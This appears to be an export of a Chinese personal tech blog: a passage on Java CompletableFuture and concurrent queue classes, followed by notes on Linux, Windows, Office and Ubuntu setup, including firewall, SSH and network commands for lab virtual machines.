两个线程任务相比较，两个全部执行完成，才进行下一步操作，不关心运行结果。
public CompletionStage&lt;Void&gt; runAfterBoth(CompletionStage&lt;?&gt; other,Runnable action);public CompletionStage&lt;Void&gt; runAfterBothAsync(CompletionStage&lt;?&gt; other,Runnable action);public CompletionStage&lt;Void&gt; runAfterBothAsync(CompletionStage&lt;?&gt; other,Runnable action,Executor executor);
示例
import java.util.concurrent.CompletableFuture;import java.util.concurrent.TimeUnit;import java.util.function.Supplier;public class CompletableFutureTest {    public static void main(String[] args) {        CompletableFuture&lt;Integer&gt; future1 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {            @Override            public Integer get() {                try {                    TimeUnit.SECONDS.sleep(1);                } catch (InterruptedException e) {                    e.printStackTrace();                }                System.out.println("第一阶段：1");                return 1;            }        });        CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {            @Override            public Integer get() {                try {                    TimeUnit.SECONDS.sleep(2);                } catch (InterruptedException e) {                    e.printStackTrace();                }                System.out.println("第二阶段：2");                return 2;            }        });        future1.runAfterBoth(future2, new Runnable() {            @Override            public void run() {                System.out.println("上面两个任务都执行完成了。");            }        }).get();    }}
anyOf
anyOf 方法的参数是多个给定的 CompletableFuture，当其中的任何一个完成时，返回这个任务的 CompletableFuture
public static void main(String[] args) throws ExecutionException, InterruptedException {    Random random = new Random();    CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; {        try {            TimeUnit.SECONDS.sleep(random.nextInt(5));        } catch (InterruptedException e) {            e.printStackTrace();        }        return "hello";    });        CompletableFuture&lt;String&gt; future2 = CompletableFuture.supplyAsync(() -&gt; {        try {            TimeUnit.SECONDS.sleep(random.nextInt(1));        } catch (InterruptedException e) {            e.printStackTrace();        }        return "world";    });    CompletableFuture&lt;Object&gt; result = CompletableFuture.anyOf(future1, future2);    System.out.println(result.get());}
allOf
allOf方法用来实现监听 多个 CompletableFuture 的全部完成。
示例
public static void main(String[] args) {    CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; {        try {            TimeUnit.SECONDS.sleep(2);        } catch (InterruptedException e) {            e.printStackTrace();        }        System.out.println("future1完成！");        return "future1完成！";    });        CompletableFuture&lt;String&gt; future2 = CompletableFuture.supplyAsync(() -&gt; {        System.out.println("future2完成！");        return "future2完成！";    });        CompletableFuture&lt;Void&gt; combindFuture = CompletableFuture.allOf(future1, future2);    try {        combindFuture.get();    } catch (InterruptedException e) {        e.printStackTrace();    } catch (ExecutionException e) {        e.printStackTrace();    }    System.out.println("future1: " + future1.isDone() + "，future2: " + future2.isDone());}
CompletableFuture：其他
getNow：提交任务继续运行
public T getNow(T valueIfAbsent)
示例：
public class CompletableFutureExample4 {    public static void main(String[] args) throws InterruptedException {        String result = CompletableFuture.supplyAsync(() -&gt; {            sleep(3);            System.out.println(System.currentTimeMillis() + " 任务继续执行");            return System.currentTimeMillis() + " HELLO";        }).getNow(System.currentTimeMillis() + " WORLD");        System.out.println(result);        sleep(5);        System.out.println(System.currentTimeMillis() + " main exit.");    }    private static void sleep(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (Exception e) {            e.printStackTrace();        }    }}# Console输出1659410799621 WORLD1659410802622 任务继续执行1659411545079 main exit.
complete：提交任务不会继续运行
如果尚未完成，则将 get() 和相关方法返回的值设置为给定值
public boolean complete(T value)
示例：
public class CompletableFutureExample5 {    public static void main(String[] args) throws ExecutionException, InterruptedException {        CompletableFuture&lt;String&gt; result = CompletableFuture.supplyAsync(() -&gt; {            sleep(3);            System.out.println(System.currentTimeMillis() + " 任务继续执行");            return System.currentTimeMillis() + " HELLO";        });        boolean status = result.complete(System.currentTimeMillis() + " WORLD");        System.out.println(System.currentTimeMillis() + " " + status);        System.out.println(result.get());        sleep(5);        System.out.println(System.currentTimeMillis() + " main exit.");    }    private static void sleep(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (Exception e) {            e.printStackTrace();        }    }}# Console输出1659410986243 true1659410986243 WORLD1659410991249 main exit. 
completeExceptionally
如果任务尚未完成，则导致调用 get() 和相关方法抛出给定的异常
public boolean completeExceptionally(Throwable ex)
示例
public class CompletableFutureExample6 {    public static void main(String[] args) throws ExecutionException, InterruptedException {        CompletableFuture&lt;String&gt; result = CompletableFuture.supplyAsync(() -&gt; {            sleep(3);            System.out.println(System.currentTimeMillis() + " 任务继续执行");            return System.currentTimeMillis() + " HELLO";        });        boolean status = result.completeExceptionally(new RuntimeException("等不及返回结果"));        System.out.println(System.currentTimeMillis() + " " + status);        // 抛出异常        System.out.println(result.get());        // 不会执行        //result.thenAccept((e) -&gt; {        //    System.out.println("-------------");        //});        // 不会执行        //result.thenApply(e -&gt; "-----");        sleep(5);        System.out.println(System.currentTimeMillis() + " main exit.");    }    private static void sleep(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (Exception e) {            e.printStackTrace();        }    }}
1659412396003 trueException in thread "main" java.util.concurrent.ExecutionException: java.lang.RuntimeException: 等不及返回结果	at java.util.concurrent.CompletableFuture.reportGet(CompletableFuture.java:357)	at java.util.concurrent.CompletableFuture.get(CompletableFuture.java:1895)	at hots.utils.executor.future.CompletableFutureExample6.main(CompletableFutureExample6.java:22)Caused by: java.lang.RuntimeException: 等不及返回结果	at hots.utils.executor.future.CompletableFutureExample6.main(CompletableFutureExample6.java:19) 
并发集合
JDK中并发队列提供了两种实现,一种是高性能队列ConcurrentLinkedQueue,一种是阻塞队列BlockingQueue,两种都继承自Queue:
BlockingQueue集合类关系图

BlockingQueue的7个子类

Queue 方法概述





Throws exception
Returns special value





Insert
add(e)
offer(e)：【@return：true if the element was added to this queue, else false】



Remove
remove()
poll()：【@return：the head of this queue, or null if the specified waiting time elapses before an element is available】



Examine
element()
peek()：【@return：the head of this queue, or null if this queue is empty】





BlockingQueue 方法概述





Throws exception
Returns special value
Blocks
Times out




Insert
add(e)
offer(e)
put(e)
offer(e, time, unit)


Remove
remove()
poll()
take()
poll(time, unit)


Examine
element()
peek()
—
—




说明



ArrayBlockingQueue
​		 基于数组的阻塞队列实现，在ArrayBlockingQueue内部，维护了一个定长数组，以便缓存队列中的数据对象，这是一个常用的阻塞队列，除了一个定长数组外，ArrayBlockingQueue内部还保存着两个整形变量，分别标识着队列的头部和尾部在数组中的位置。ArrayBlockingQueue在生产者放入数据和消费者获取数据，都是共用同一个锁对象，由此也意味着两者无法真正并行运行，这点尤其不同于LinkedBlockingQueue； 按照实现原理来分析，ArrayBlockingQueue完全可以采用分离锁，从而实现生产者和消费者操作的完全并行运行。Doug Lea之所以没这样去做，也许是因为ArrayBlockingQueue的数据写入和获取操作已经足够轻巧，以至于引入独立的锁机制，除了给代码带来额外的复杂性外，其在性能上完全占不到任何便宜。  ArrayBlockingQueue和LinkedBlockingQueue间还有一个明显的不同之处在于，前者在插入或删除元素时不会产生或销毁任何额外的对象实例，而后者则会生成一个额外的Node对象。这在长时间内需要高效并发地处理大批量数据的系统中，其对于GC的影响还是存在一定的区别。而在创建ArrayBlockingQueue时，我们还可以控制对象的内部锁是否采用公平锁，默认采用非公平锁。


LinkedBlockingQueue

基于链表的阻塞队列，同ArrayBlockingQueue类似，其内部也维持着一个数据缓冲队列（该队列由一个链表构成）。当生产者往队列中放入一个数据时，队列会从生产者手中获取数据，并缓存在队列内部，而生产者立即返回；只有当队列缓冲区达到最大值缓存容量时（LinkedBlockingQueue可以通过构造函数指定该值），才会阻塞生产者队列，直到消费者从队列中消费掉一份数据，生产者线程会被唤醒，反之对于消费者这端的处理也基于同样的原理。而LinkedBlockingQueue之所以能够高效的处理并发数据，还因为其对于生产者端和消费者端分别采用了独立的锁来控制数据同步，这也意味着在高并发的情况下生产者和消费者可以并行地操作队列中的数据，以此来提高整个队列的并发性能。
作为开发者，我们需要注意的是，如果构造一个LinkedBlockingQueue对象，而没有指定其容量大小，LinkedBlockingQueue会默认一个类似无限大小的容量（Integer.MAX_VALUE），这样的话，如果生产者的速度一旦大于消费者的速度，也许还没有等到队列满阻塞产生，系统内存就有可能已被消耗殆尽了
ArrayBlockingQueue和LinkedBlockingQueue是两个最普通也是最常用的阻塞队列，一般情况下，在处理多线程间的生产者消费者问题，使用这两个类足以



PriorityBlockingQueue
​		基于优先级的阻塞队列（优先级的判断通过构造函数传入的Compator对象来决定），但需要注意的是PriorityBlockingQueue并不会阻塞数据生产者，而只会在没有可消费的数据时，阻塞数据的消费者。因此使用的时候要特别注意，生产者生产数据的速度绝对不能快于消费者消费数据的速度，否则时间一长，会最终耗尽所有的可用堆内存空间。在实现PriorityBlockingQueue时，内部控制线程同步的锁采用的是公平锁


DelayQueue
​		DelayQueue中的元素只有当其指定的延迟时间到了，才能够从队列中获取到该元素。DelayQueue是一个没有大小限制的队列，因此往队列中插入数据的操作（生产者）永远不会被阻塞，而只有获取数据的操作（消费者）才会被阻塞。
​		DelayQueue使用场景较少，但都相当巧妙，常见的例子比如使用一个DelayQueue来管理一个超时未响应的连接队列。


SynchronousQueue
​		一种无缓冲的等待队列，生产者产生的数据直接会被消费者获取并消费， 类似于无中介的直接交易，有点像原始社会中的生产者和消费者，生产者拿着产品去集市销售给产品的最终消费者，而消费者必须亲自去集市找到所要商品的直接生产者，如果一方没有找到合适的目标，那么对不起，大家都在集市等待。相对于有缓冲的BlockingQueue来说，少了一个中间经销商的环节（缓冲区），如果有经销商，生产者直接把产品批发给经销商，而无需在意经销商最终会将这些产品卖给那些消费者，由于经销商可以库存一部分商品，因此相对于直接交易模式，总体来说采用中间经销商的模式会吞吐量高一些（可以批量买卖）；但另一方面，又因为经销商的引入，使得产品从生产者到消费者中间增加了额外的交易环节，单个产品的及时响应性能可能会降低。
​		声明一个SynchronousQueue有两种不同的方式，它们之间有着不太一样的行为。
公平模式和非公平模式的区别:


如果采用公平模式：SynchronousQueue会采用公平锁，并配合一个FIFO队列来阻塞多余的生产者和消费者，从而体系整体的公平策略；


但如果是非公平模式（SynchronousQueue默认）：SynchronousQueue采用非公平锁，同时配合一个LIFO队列来管理多余的生产者和消费者，而后一种模式，如果生产者和消费者的处理速度有差距，则很容易出现饥渴的情况，即可能有某些生产者或者是消费者的数据永远都得不到处理。




LinkedTransferQueue
传入的数据，需要担保被使用了。否则放入失败/阻塞
private static final int NOW   = 0; // for untimed poll, tryTransferprivate static final int ASYNC = 1; // for offer, put, addprivate static final int SYNC  = 2; // for transfer, takeprivate static final int TIMED = 3; // for timed poll, tryTransfer






ArrayBlockingQueue
PriorityBlockingQueue
LinkedBlockingQueue
LinkedBlockingDeque
SynchronousQueue
DelayQueue
LinkedTransferQueue




bounded（边界）
Y
N
Optional
Optional
Y
N
N


add
添加成功：返回true；添加失败（已满）：抛出IllegalStateException
调用offer，返回结果同offer
调用offer添加成功：返回true；添加失败（false）：抛出IllegalStateException
由addLast执行调用offerLast添加成功：返回true；添加失败（false）：抛出IllegalStateException
调用offer添加成功：返回true；添加失败（已满）：抛出IllegalStateException
同offer
在尾部插入元素无边界Queue，不会抛出IllegalStateException，或者false。添加成功：返回true；


offer
添加成功：返回true；添加失败(已满)：返回false
添加成功，返回true；无边界，不存在已满抛出异常：元素无法compare
队尾添加成功：返回true；添加失败(已满)：返回false
同offerLast队尾添加成功：返回true；添加失败(已满)：返回false
如果另一个线程正在等待接收，则将指定元素插入此队列，返回true;没有接收线程，返回false
在尾部插入元素添加成功，返回true；无边界Queue，不存在已满
同 add


put（阻塞）
将指定元素插入此队列的==尾部==，如果队列已满，则==等待空间可用==
同offer。无边界，无需阻塞。
在此队列的尾部插入指定元素，如有必要，则==等待空间可用==。
同putLast在此队列的尾部插入指定元素，如有必要，则==等待空间可用==。
将指定元素添加到此队列中，阻塞，等待另一个线程接收它。
同offer
同add


remove
poll头部元素，如果为null，则会抛出异常
poll头部元素，如果为null，则会抛出异常
poll头部元素，如果为null，则会抛出异常
 同removeFirst  pollFirst头部元素，如果为null，则会抛出异常
poll头部元素，如果为null，则会抛出异常
poll头部元素，如果为null，则会抛出异常
poll头部元素，如果为null，则会抛出异常


poll
移除头部元素并返回无元素返回null
移除头部元素并返回无元素返回null
移除头部元素并返回无元素返回null
 同pollFirst  移除头部元素并返回无元素返回null
移除头部元素并返回如果没有可用元素，则返回 null无元素返回null
移除头部元素并返回如果此队列没有具有过期延迟的元素，则返回null无元素返回null
移除头部元素并返回无元素返回null


element
peek 头部元素若结果为null，则抛出异常NoSuchElementException
peek 头部元素若结果为null，则抛出异常NoSuchElementException
peek 头部元素若结果为null，则抛出异常NoSuchElementException
**peekFirst**头部元素若结果为null，则抛出异常NoSuchElementException
peek 头部元素永远抛出NoSuchElementException
peek 头部元素若结果为null，则抛出异常NoSuchElementException
peek 头部元素若结果为null，则抛出异常NoSuchElementException


peek
获取头部元素不会删除元素
获取头部元素不会删除元素
获取头部元素不会删除元素
**peekFirst**头部元素获取头部元素不会删除元素
直接 return null
获取头部元素不会删除元素
获取头部元素不会删除元素


take（阻塞）
移除头部元素并返回队列无元素，则阻塞等待
移除头部元素并返回队列无元素，则阻塞等待
移除头部元素并返回队列无元素，则阻塞等待
同**takeFirst**移除头部元素并返回队列无元素，则阻塞等待
一直等待，直到有另一个线程transfer元素
一直等待，直到有线程放进元素，且头部元素过期
一直等待，直到有线程放进元素


transfer
无
无
无
无
无
无
在队列尾部插入元素，若没有被消费，则一直等待





ConcurrentHashMap


ConcurrentSkipListMap


ConcurrentSkipListSet


ConcurrentLinkedQueue


ConcurrentLinkedDeque


CopyOnWriteArrayList


CopyOnWriteArraySet


]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux日常使用</title>
    <url>/20250614/fb3eb231.html</url>
    <content><![CDATA[提高打开文件限制量


解除 Linux 系统的最大进程数和最大文件打开数限制
vi /etc/security/limits.conf# 添加如下的行# 说明：* 代表针对所有用户 noproc 是代表最大进程数 nofile 是代表最大文件打开数 * soft noproc 11000 * hard noproc 11000 * soft nofile 4100 * hard nofile 4100


让 SSH 接受 Login 程式的登入，方便在 ssh 客户端查看 ulimit -a  资源限制：
vi /etc/ssh/sshd_config # 把 UserLogin 的值改为 yes，并把 # 注释去掉# 重启 sshd 服务： /etc/init.d/sshd restart


修改所有 linux 用户的环境变量文件：
vi /etc/profileulimit -u 10000ulimit -n 4096ulimit -d unlimitedulimit -m unlimitedulimit -s unlimitedulimit -t unlimitedulimit -v unlimited


Linux系统增加zysong字体

背景：在开发项目中，使用到了Jfreechart，在本机环境测试正常，部署到服务器上Linux，发现Jfreechart里面的中文不能正常显示。


首先确认你的服务器上的javahome ，执行命令 echo $JAVA_HOME ,显示出java的目录
将zysong.ttf文件拷贝到%JavaHome%/jre/lib/fonts目录下 zysong.ttf 需要网上下载
在%JavaHome%/jre/lib/fonts目录下执行"ttmkfdir -o fonts.dir"命令,重新生成fonts.dir文件
确认/usr/share/zh_CN/TrueType目录存在,如果不存在则mkdir创建 ，，一般开始是没有的，所有这样执行：到/usr/share/fonts下，mkdir zh_CN 命令创建 zh_CN文件夹，到zh_CN目录下 mkdir TrueType命令创建TrueType文件夹
把zysong.ttf文件拷贝到TrueType下
在%JavaHome%/jre/lib目录下,执行 cp fontconfig.RedHat.3.properties.src fontconfig.properties
重新启动tomcat（resin等web容器）,现在再看看，中文显示正常了

VMware安装Centos虚拟机
==安装系统==


准备安装VMware和下载Centos


虚拟网络说明




VMNet1
使用的是host-only的链接模式，即虚拟机只能与主机构成内部通信，无法对外网进行访问。


VMNet0
模式：使用桥接模式，安装VM后，在VM里建立虚拟机 默认 就是该模式。场景：如果你只是需要一台虚拟机可以和宿主互通，并可以访问外网，此模式即可。描述：安装虚拟机系统后不需要调整网络，物理网络中的 “路由” 所包含的DHCP服务器会自动识别该虚拟机并为其分配IP地址；如果没有路由，可以自己手动在系统分配，原则是和宿主机在同一网段并指向相同的网关即可通信。


VMNet8
模式：NAT网络模式场景：在宿主机安装多台虚拟机，和宿主组成一个小局域网，宿主机，虚拟机之间都可以互相通信，虚拟机也可访问外网，例如 搭建 hadoop 集群，分布式服务



下载虚拟机Centos：https://www.centos.org/download/

==系统基础配置==


修改 hotsname
hostnamectl --static set-hostname 名称 vi /etc/hostname(缓存？)，要先把这个改好了，下面的配置文件才会生效。 vi  /etc/sysconfig/network（重启，永久） echo hostname &gt; /proc/sys/kernel/hostname（即时生效，临时）


基础工具安装
yum -y install wget   (wget)yum -y install net-tools   (ifconfig)yum -y install lrzsz   (sz和rz)yum -y install tree


==虚拟机之间，SSH免密连接==
ssh-keygen -t rsa -b 4096cd /root/.sshmv id_rsa.pub authorized_keys_master.pubscp  authorized_keys_node1.pub root@master:/root/.sshscp  authorized_keys_node2.pub root@master:/root/.sshcat authorized_keys_master.pub&gt;&gt; authorized_keyscat authorized_keys_node1.pub&gt;&gt; authorized_keyscat authorized_keys_node2.pub&gt;&gt; authorized_keysscp authorized_keys  root@node1:/root/.sshscp authorized_keys  root@node2:/root/.ssh
==默认ROOT用户登录==
使用root账户进入系统后，打开/etc/gdm/custom.conf文件，在[daemon]下添加两行：
AutomaticLoginEnable=TrueAutomaticLogin=root
==Centos8 时钟同步==


cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime


vim /etc/chrony.conf
注释掉   pool 2.centos.pool.ntp.org iburst  加入新的的时间服务器  server 210.72.145.44 iburst  server ntp.aliyun.com iburst


重启服务，此时时间已经与网络时间同步
systemctl restart chronyd.service


设置开机自启
systemctl enable chronyd.service


==安装图形界面==


命令安装
yum groupinstall "X Window System"yum groupinstall "GNOME Desktop"


进入图形界面
startx 或者 init 5 


修改图形界面为默认启动方式
命令行输入命令后重启系统 systemctl set-default graphical.target 


安装中文支持
yum groupinstall "Chinese Support" -y 


修改系统默认语言为中文
命令行输入命令后重启系统localectl set-locale LANG=zh_CN.UTF-8 


图形界面想要卸载
yum groupremove "GNOME Desktop Environment"yum groupremove "X Window System"


==问题记录：网络连接图标消失==


原因一：查看相关服务是否启动
进入计算机管理——&gt;服务查看这一块是不是有被关闭了的，有的话就开启



原因二：NetworkManager 未运行
# 启动NetworkManagersystemctl start NetworkManager# 查看 NetworkManager 的运行状态。 如果显示Active: inactive (dead)，则表示 NetworkManager 未运行。systemctl status NetworkManager# 将 NetworkManager 设为开机自启：systemctl enable NetworkManager# 查看是否开机启动：systemctl is-enabled NetworkManager


原因三：NetworkManager 未接管网络（此方法解决）
在终端中输入以下命令，查看 NetworkManager 是否接管了网络：nmcli networking如果输出 disabled，则表示 NetworkManager 未接管网络，网络图标消失也是由此导致的。
这时候查看网卡，会提示“未托管”：
[root@localhost ~]# nmcli device status DEVICE      TYPE      STATE   CONNECTION    ens33       ethernet  未托管  -- 
连接网卡（以 ens33 网卡为例），会提示失败：
[root@localhost ~]# nmcli device connect ens33错误：添加/激活新连接失败：Connection 'ens33' is not available on device ens33 because device is strictly unmanaged
解决办法：只需要一条命令就能搞定，在终端中输入：nmcli networking on


]]></content>
      <categories>
        <category>Linux</category>
        <category>日常使用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux防火墙</title>
    <url>/20230511/e26546c7.html</url>
    <content><![CDATA[Centos 防火墙
firewall服务
# 查看默认防火墙状态firewall-cmd --state# 启动systemctl start firewalld# 开机启动systemctl enable firewalld# 重新载入，更新防火墙规则firewall-cmd --reload# 关闭防火墙systemctl stop firewalld.service # 或者关闭防火墙systemctl disable firewalld.service# 重启防火墙systemctl restart firewalld.service
firewall配置


查看防火墙规则
  # 查看全部端口firewall-cmd --zone=public --list-ports# 全部规则firewall-cmd --list-all# 查看指定端口firewall-cmd --zone=public --query-port=3306/tcp


查看区域信息
  firewall-cmd --get-active-zonesfirewall-cmd --list-all-zones


暴露端口
  #添加端口 firewall-cmd --permanent --zone=public --add-port=3306/tcp#删除端口firewall-cmd  -permanent --remove-port=3306/tcp 


IP白名单（添加）
  # 添加白名单firewall-cmd --permanent --zone=trusted --add-source=10.42.0.15# 移除白名单firewall-cmd --permanent --zone=trusted --remove-source=10.42.0.15# 更新防火墙规则firewall-cmd  --reload# 查看IP白名单firewall-cmd  --zone=trusted --list-all#开启某个端口(指定IP可访问)firewall-cmd --permanent --zone=public --add-rich-rule='rule family="ipv4" source address="10.1.1.14/32" port protocol="tcp" port="80" accept'#删除策略firewall-cmd --permanent --zone=public --remove-rich-rule='rule family="ipv4" source address="10.1.1.14/32" port protocol="tcp" port="80" accept'# 把docker0网卡添加到trusted域firewall-cmd --permanent --zone=trusted --change-interface=docker0


]]></content>
      <categories>
        <category>Linux</category>
        <category>防火墙</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows日常使用问题记录</title>
    <url>/20230216/d9a8c0d4.html</url>
    <content><![CDATA[Windows 查看端口占用


获取占用端口的进程ID  netstat -ano|findstr 10001


获取进程信息 tasklist|findstr 9352


关闭进程（强行关闭） taskkill /PID 9140 /T /F


Windows 删除服务


列出所有服务，确认要删除的服务名称：


sc query state= all | find “SERVICE_NAME”


查看指定服务的详细信息：


sc queryex &lt;服务名&gt;


停止服务


net stop MySQL


删除服务


sc delete MySQL


验证是否已删除


sc query MySQL


Windows网络配置
重置网络设置

netsh winsock reset

配置IP


查看接口名称：
netsh interface ip show interface
netsh interface ip show config
配置接口地址：
netsh interface ipv4 set address name=“以太网” static 192.168.10.10 255.255.255.0 192.168.1.1
配置dhcp自动获取ip
netsh interface ipv4 set address name=“以太网” source=dhcp


配置DNS


配置DNS服务器
netsh interface ipv4 set dnsserver name=“以太网” static 223.5.5.5 index=1
netsh interface ipv4 set dnsserver name=“以太网” static 223.6.6.6 index=2
自动获取
netsh interface ipv4 set dnsserver name=“以太网” source=dhcp


Windows 设置护眼颜色

豆沙绿 RGB（202，234，206），#CAEACE
淡黄色RGB（253，246，227），#FDF6E3 【选用】



首先使用 Win + R 组合快捷键，打开“运行”，然后键入打开注册表命令「regedit」，按回车键确认打开，如图所示


打开Win10注册表之后，依次在左侧树状菜单中展开：HKEY_CURRENT_USER\Control Panel\Colors然后再右侧找到「Windows」值，并双击打开，将默认的255 255 255（默认是白色背景）三组颜色数值改成 253，246，227完成后，点击下方的“确定”保存，如图所示。



继续找到注册表的路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\DefaultColors\Standard
同样再在右侧找到「Windows」双击打开，将默认的数据值 ffffff 改成  FDF6E3 完成后，点击下方的确定保存如下图所示。

完成以上三步操作后，需要重启电脑生效


Windows 命令行命令记录



说明
命令




ipconfig /flushdns
Windows刷新DNS命令


wmic memphysical get maxcapacity
查看支持的最大内存容量







Windows将 jar注册成windows服务

下载Windows Service Wrapper ：https://github.com/winsw/winsw/releases



安装windows服务



将java jar包和下载的WinSW.NET4.exe放在同一个文件夹目录下面


重命名WinSW.NET4.exe为MyApp.exe(这个可以任意取)，新建个MyApp.xml(这个必须和前者的exe文件名字相同)


编辑MyApp.xml文件
&lt;configuration&gt;&lt;id&gt;MyApp&lt;/id&gt;&lt;name&gt;MyApp&lt;/name&gt;&lt;description&gt;This is MyApp.&lt;/description&gt;&lt;executable&gt;java&lt;/executable&gt;&lt;arguments&gt;-jar C:\Users\tanhw119214\Desktop\MyApp\MyApp.jar&lt;/arguments&gt;&lt;!-- 开机启动 --&gt;&lt;startmode&gt;Automatic&lt;/startmode&gt;&lt;!-- 要注册服务的文件的父路径 --&gt;&lt;logpath&gt;C:\Users\tanhw119214\Desktop\MyApp\logs&lt;/logpath&gt;&lt;log mode="roll-by-time"&gt;&lt;pattern&gt;yyyyMMdd&lt;/pattern&gt;&lt;/log&gt;&lt;/configuration&gt;


进入根目录下面，执行以下cmd命令，注册服务。
MyApp.exe install 
然后在服务里面就能找到这个实例了
#启动命令net start MyApp#停止命令net stop MyApp#卸载命令sc delete MyApp


VPN连接报错


问题描述
确认VPN信息正确的条件下，选择PPTP协议连接，提示 “不能建立到远程计算机的连接。你可能需要更改此连接的网络设置” 的错误


问题排除
event 打开 事件查看器，获取VPN连接失败错误代码



搜索对应的问题描述：尝试建立 VPN 连接时出现“失败后返回的错误代码为 720”


最终解决方案：重新安装 WAN 微型端口 (IP) 接口驱动程序


Windows 开放端口（8080）
查看端口

查看端口： &gt;netstat -nao|findstr :8080

netstat：网络统计工具（Network Statistics），用于监控网络连接和协议统计
-n：以数字形式显示地址和端口（不解析为主机名或服务名）
-a：显示所有活动的连接和监听的端口（包括 TCP 和 UDP）
配合 -p（Linux）或 -o（Windows）查看进程 PID


命令行添加
# 管理员运行netsh advfirewall firewall add rule name="Tomcat Port 8080" dir=in action=allow protocol=TCP localport=8080netsh advfirewall firewall add rule name="Tomcat Port 8080" dir=out action=allow protocol=TCP localport=8080
控制面板添加
控制面板 -&gt; 所有控制面板项 -&gt; Windows 防火墙 -&gt; 高级设置 进入
入站规则设置
第一步 选择 入站规则 然后 新建规则，选择 端口，然后下一步
第二步 选择TCP 选择特定端口 然后输入端口，如有多个端口需要用逗号隔开了 例如:88,8080
第三步 选择允许连接
第四步 选择应用规则的范围
第五步 输入规则名称
出站规则设置
第一步 选择 出站规则 然后 新建规则，选择 端口，然后下一步
第二步 选择TCP 选择特定端口 然后输入端口，如有多个端口需要用逗号隔开了 例如:88,8080
第三步 选择允许连接
第四步 选择应用规则的范围
第五步 输出规则名称

另外win7的 IIS7，只需启用 入站规则：BranchCache 内容检索(HTTP-In)。出站规则： BranchCache 内容检索(HTTP-Out) 即可。

Windows 特殊文件路径



说明
路径




开机启动程序路径
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


host文件位置
C:\Windows\System32\drivers\etc















PowerShell 执行脚本报错
window power shell 错误提示：因为在此系统上禁止运行脚本
 

电脑左下角搜索windows powershell , 以管理员身份运行。输入get-ExecutionPolicy， 回车
显示Restricted，表示受限制的，执行脚本受限。输入set-ExecutionPolicy， 回车，然后输入：RemoteSigned， 即下载的脚本执行时才需要签名
确认操作，输入Y

Windows给powershell设定一个叫“执行策略”的东西。为了避免一些恶意脚本直接运行，一般家用的windows系统默认将执行策略设置成了“Restricted”，即受限制的。
所有的执行策略如下所示:



策略
说明




AllSigned
要求所有脚本和配置文件均需受信任的发布者签名，包括在本地计算机上编写的脚本。（安全但是本地编写的脚本也要签名，麻烦）


Bypass
不会阻止你运行任何脚本，也没有提示和警告。（不安全）


Default
默认的执行策略，普通桌面Windows默认Restricted，服务器windows默认RemoteSigned


RemoteSigned
要求从互联网上下载的所有脚本和配置文件均需要受信任的发布者签名，本地脚本则不需要签名。是Windows服务器的默认执行策略。（较为安全）


Restricted
无法加载配置文件或运行脚本。桌面Windows的默认执行策略。(安全，但无法运行脚本)


Unrestricted
为允许所有的脚本运行







]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>WORD使用记录</title>
    <url>/20221030/8bc474d9.html</url>
    <content><![CDATA[Word
插入复选框
输入“2611”，选中编号，按 “Alt+X”,是需要插入对勾,输入“2612”，选中编号，按 “Alt+X”,是需要插入叉号
插入带圈数字


切换到英文输入法，按小键盘Num Lock键启小键盘。


将光标移到输入带圈的符处，打小键盘2460，接着按组合键Alt +X松开，这时刚才显示的2460就转换成带圈字符①。
打小键盘2473，接着按组合键Alt +X松开，这时刚才显示的2473就转换成带圈字符⑳。


以下是带圈数字1-20的代码对应关系：
1/2460；2/2461；3/2462；4/2463；5/2464；6/2465；7/2466；8/2467；9/2468；10/2469；11/246a；12/246b；13/246c；14/246d；15/246e；16/246f；17/2470；18/2471；19/2472；20/ 2473 


20以上的暂没有快捷方式，可用其它方法输入，如用“格式”→“中文版式”→“带圈字符”来打。


Excel
输入时间



快捷键





ctrl+;
输入日期


ctrl+shift+#
应用含年，月，日的``“``日期``”``格式


ctrl+shift+;
插入时间


ctrl+shift+@
应用含小时和分钟并标明上午或下午的``“``时间``”``格式



显示被自动隐藏的单引号


设置单元格格式——数字选项卡——自定义：自己在那里输入 “'”@——确定！


使用公式：=“'”&amp;A2



]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Office</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu虚拟机搭建</title>
    <url>/20221030/6124f545.html</url>
    <content><![CDATA[基础工具安装


apt-get -y install wget    (wget)


apt-get -y install net-tools   (ifconfig)


snap install curl


安装软件
teamviewer_linux.debsudo dpkg --install teamviewer_linux.deb
首次登录切换root
su切换至root权限时报错su: Authentication failure
分析原因：可能是初次使用此命令，需要更新root密码
解决方法：执行sudo passwd root命令，完成后再次输入su即可切换权限

安装SSH服务器端


执行apt-get install openssh-server ，安装服务端


允许远程使用root账号ssh登入
修改/etc/ssh/sshd_config文件，修改如下：
#PermitRootLogin prohibit-passwordPermitRootLogin yes
需要重启系统或者sshd服务

sudo /etc/init.d/ssh stop
sudo /etc/init.d/ssh start
sudo service ssh start



开机启动sudo systemctl enable ssh


重启之后，/usr/bin/xauth: file /root/.Xauthority does not exist 错误消失


]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 防火墙</title>
    <url>/20221030/b8b8d517.html</url>
    <content><![CDATA[查看防火墙的状态
sudo ufw status
inactive表示防火墙没有开启，并不是没有安装防火墙。
安装防火墙（Ubuntu系统默认是安装了ufw防火墙的）：
sudo apt-get install ufw
Ubuntu开启防火墙
sudo ufw enable
